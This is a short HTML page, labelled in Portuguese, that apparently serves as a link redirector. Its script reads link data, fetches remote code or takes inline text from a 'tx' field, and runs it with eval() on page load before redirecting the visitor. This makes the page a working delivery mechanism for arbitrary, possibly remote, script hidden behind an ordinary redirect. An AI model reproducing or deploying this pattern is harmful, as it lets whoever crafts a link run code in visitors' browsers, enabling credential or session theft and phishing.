<h1 id="site" hidden>Carregando...</h1>

<script type="module">
    import { get_website } from "./scripts/GetUrl.js";
    import { redirect } from "./scripts/Redirect.js";

    const data = get_website();
    const text = document.getElementById("site");

    async function executar() {
        if (!data) {
            window.location.href = "criar.html";
            return;
        }

        text.textContent = data.url;

        if (data.tx) {
            if (data.itsraw) {
                try {
                    const response = await fetch(data.tx);

                    if (!response.ok) {
                        throw new Error("Não foi possível carregar a raw.");
                    }

                    const code = await response.text();

                    if (data.waitTx) {
                        await eval(`(async () => { ${code} })()`);
                    } else {
                        eval(code);
                    }

                } catch (err) {
                    console.error(err);
                }

            } else {
                if (data.waitTx) {
                    await eval(`(async () => { ${data.tx} })()`);
                } else {
                    eval(data.tx);
                }
            }
        }

        if (data.mostrarSite) {
            text.hidden = false;
        }

        redirect(data.url);
    }

    executar();
</script>
